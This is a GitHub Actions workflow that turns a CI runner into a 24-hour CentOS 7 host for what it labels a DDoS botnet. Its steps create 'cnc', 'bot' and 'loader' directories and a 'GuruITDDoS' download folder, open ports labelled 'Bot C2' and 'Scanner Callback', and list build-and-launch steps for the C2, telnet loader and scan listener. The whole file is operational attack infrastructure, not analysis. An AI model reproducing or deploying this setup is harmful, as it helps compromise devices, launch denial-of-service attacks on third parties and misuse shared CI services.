name: CentOS7-Minimal-Builder

on:
  workflow_dispatch:

jobs:
  centos7:
    runs-on: ubuntu-latest
    timeout-minutes: 360

    steps:
      - name: Checkout Repository
        uses: actions/checkout@v4

      - name: Start CentOS 7 Container
        run: |
          docker pull centos:7
          docker run -d \
            --name centos7 \
            --privileged \
            -p 1302:1302 \
            -p 80:80 \
            -p 443:443 \
            -p 9473:9473 \
            -p 69:69/udp \
            -v ${{ github.workspace }}:/workspace \
            --restart unless-stopped \
            centos:7 /sbin/init
          sleep 10

      - name: Fix CentOS 7 Repositories
        run: |
          docker exec centos7 bash -c '
            # Backup and replace with vault repos
            cp -f /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.bak 2>/dev/null || true
            echo "[base]" > /etc/yum.repos.d/CentOS-Vault.repo
            echo "name=CentOS-7 - Base" >> /etc/yum.repos.d/CentOS-Vault.repo
            echo "baseurl=http://vault.centos.org/7.9.2009/os/\$basearch/" >> /etc/yum.repos.d/CentOS-Vault.repo
            echo "gpgcheck=1" >> /etc/yum.repos.d/CentOS-Vault.repo
            echo "gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7" >> /etc/yum.repos.d/CentOS-Vault.repo
            echo "enabled=1" >> /etc/yum.repos.d/CentOS-Vault.repo
            echo "" >> /etc/yum.repos.d/CentOS-Vault.repo
            echo "[updates]" >> /etc/yum.repos.d/CentOS-Vault.repo
            echo "name=CentOS-7 - Updates" >> /etc/yum.repos.d/CentOS-Vault.repo
            echo "baseurl=http://vault.centos.org/7.9.2009/updates/\$basearch/" >> /etc/yum.repos.d/CentOS-Vault.repo
            echo "gpgcheck=1" >> /etc/yum.repos.d/CentOS-Vault.repo
            echo "gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7" >> /etc/yum.repos.d/CentOS-Vault.repo
            echo "enabled=1" >> /etc/yum.repos.d/CentOS-Vault.repo
            echo "" >> /etc/yum.repos.d/CentOS-Vault.repo
            echo "[extras]" >> /etc/yum.repos.d/CentOS-Vault.repo
            echo "name=CentOS-7 - Extras" >> /etc/yum.repos.d/CentOS-Vault.repo
            echo "baseurl=http://vault.centos.org/7.9.2009/extras/\$basearch/" >> /etc/yum.repos.d/CentOS-Vault.repo
            echo "gpgcheck=1" >> /etc/yum.repos.d/CentOS-Vault.repo
            echo "gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7" >> /etc/yum.repos.d/CentOS-Vault.repo
            echo "enabled=1" >> /etc/yum.repos.d/CentOS-Vault.repo
            echo "" >> /etc/yum.repos.d/CentOS-Vault.repo
            echo "[epel]" >> /etc/yum.repos.d/CentOS-Vault.repo
            echo "name=Extra Packages for Enterprise Linux 7 - \$basearch" >> /etc/yum.repos.d/CentOS-Vault.repo
            echo "baseurl=http://download.fedoraproject.org/pub/epel/7/\$basearch" >> /etc/yum.repos.d/CentOS-Vault.repo
            echo "enabled=1" >> /etc/yum.repos.d/CentOS-Vault.repo
            echo "gpgcheck=0" >> /etc/yum.repos.d/CentOS-Vault.repo
            yum clean all
            rm -rf /var/cache/yum/*
          '

      - name: Install Essential Tools
        run: |
          docker exec centos7 bash -c '
            yum install -y epel-release
            yum update -y
            yum install -y \
              gcc gcc-c++ make \
              wget curl git \
              screen nano \
              tar bzip2 gzip \
              python3 \
              glibc-static \
              gmp-devel \
              httpd \
              xinetd tftp tftp-server \
              iptables-services \
              firewalld \
              --skip-broken
          '

      - name: Install Tailscale
        env:
          TAILSCALE_AUTH_KEY: ${{ secrets.TAILSCALE_AUTH_KEY }}
        run: |
          docker exec centos7 bash -c '
            curl -fsSL https://tailscale.com/install.sh | sh
            systemctl enable tailscaled
            systemctl start tailscaled || tailscaled 2>/dev/null &
            sleep 5
            tailscale up --authkey=$TAILSCALE_AUTH_KEY --hostname=centos7-builder --ssh
            sleep 5
            TS_IP=$(tailscale ip -4 2>/dev/null)
            echo "TAILSCALE_IP=$TS_IP" >> /etc/environment
            echo "‚úÖ Tailscale IP: $TS_IP"
          '

      - name: Configure Firewall
        run: |
          docker exec centos7 bash -c '
            systemctl start firewalld 2>/dev/null || service firewalld start 2>/dev/null || true
            firewall-cmd --permanent --direct --add-rule ipv4 filter INPUT 0 \
              -i tailscale0 -p tcp --dport 1302 -j ACCEPT 2>/dev/null || true
            firewall-cmd --permanent --add-port={80,443,1302,9473}/tcp 2>/dev/null || true
            firewall-cmd --permanent --add-port=69/udp 2>/dev/null || true
            firewall-cmd --reload 2>/dev/null || true
            iptables -I INPUT -i tailscale0 -p tcp --dport 1302 -j ACCEPT 2>/dev/null || true
            echo "‚úÖ Firewall configured"
          '

      - name: Copy Source Files (if present)
        run: |
          docker exec centos7 mkdir -p /root/cnc /root/bot /root/loader
          docker exec centos7 mkdir -p /var/www/html/GuruITDDoS
          [ -d "./cnc" ] && docker cp ./cnc/. centos7:/root/cnc/
          [ -d "./bot" ] && docker cp ./bot/. centos7:/root/bot/
          [ -d "./loader" ] && docker cp ./loader/. centos7:/root/loader/

      - name: Display Connection Info
        run: |
          TS_IP=$(docker exec centos7 tailscale ip -4 2>/dev/null || echo "Not connected")
          PUBLIC_IP=$(curl -s ifconfig.me)
          echo ""
          echo "========================================="
          echo "‚úÖ CentOS 7 Container is READY!"
          echo "========================================="
          echo "üîµ TAILSCALE IP: $TS_IP"
          echo "   - CNC Admin Panel: $TS_IP:1302"
          echo "   - SSH: docker exec -it centos7 bash"
          echo ""
          echo "üåê PUBLIC IP: $PUBLIC_IP"
          echo "   - HTTP Download: http://$PUBLIC_IP/GuruITDDoS/"
          echo "   - Bot C2: $PUBLIC_IP:1302"
          echo "   - Scanner Callback: $PUBLIC_IP:9473"
          echo ""
          echo "üìÅ Your source files: /root/cnc, /root/bot, /root/loader"
          echo "   (if you placed them in your repo)"
          echo ""
          echo "‚öôÔ∏è  Next steps:"
          echo "   1. docker exec -it centos7 bash"
          echo "   2. Edit IPs in /root/bot/main.c and /root/loader/telnet.c"
          echo "   3. cd /root && chmod +x build.sh && ./build.sh"
          echo "   4. Start services (./cnc, ./scanListen, ./loader, systemctl start httpd)"
          echo ""
          echo "‚è≥ Container will stay alive for 24 hours."
          echo "========================================="

      - name: Keep Container Alive (24h)
        run: sleep 86400

      - name: Cleanup
        if: always()
        run: |
          docker stop centos7 || true
          docker rm centos7 || true
